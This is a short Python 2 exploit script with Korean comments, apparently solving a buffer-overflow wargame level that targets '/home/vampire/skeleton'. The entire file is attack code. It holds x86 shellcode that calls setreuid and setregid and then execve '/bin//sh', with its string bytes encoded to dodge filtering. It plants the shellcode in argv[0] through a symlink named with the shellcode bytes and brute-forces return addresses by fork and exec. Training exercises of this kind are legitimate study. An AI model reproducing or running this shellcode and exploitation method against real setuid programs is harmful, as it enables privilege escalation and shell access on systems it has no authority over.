import os
import struct

payload = ""
target = "/home/vampire/skeleton"
shellcode = "\x90"*50 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\xbf\x1e\x1e\x62\x57\x81\xc7\x11\x11\x11\x11\x57\xbf\x1e\x51\x58\x5d\x81\xc7\x11\x11\x11\x11\x57\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"

#리틀 엔디언
def p(x):
    return struct.pack("<L", x)

#페이로드 문자열 더하기
def append(x):
    return payload + x

#심볼릭 링크가 있다면 삭제
if os.path.exists(shellcode):
    os.remove(shellcode)

#심볼릭 링크
os.symlink(target, shellcode)
payload = append("A"*44)

for count in xrange(0, 30):
    ret = 0xbfffff7e + count
    _payload = append(p(ret))

    print "ret address : " + hex(ret)

    pid = os.fork()
    #자식 프로세스
    if pid == 0:
        os.execv(shellcode, (shellcode, _payload))
    else:
        os.waitpid(pid, 0)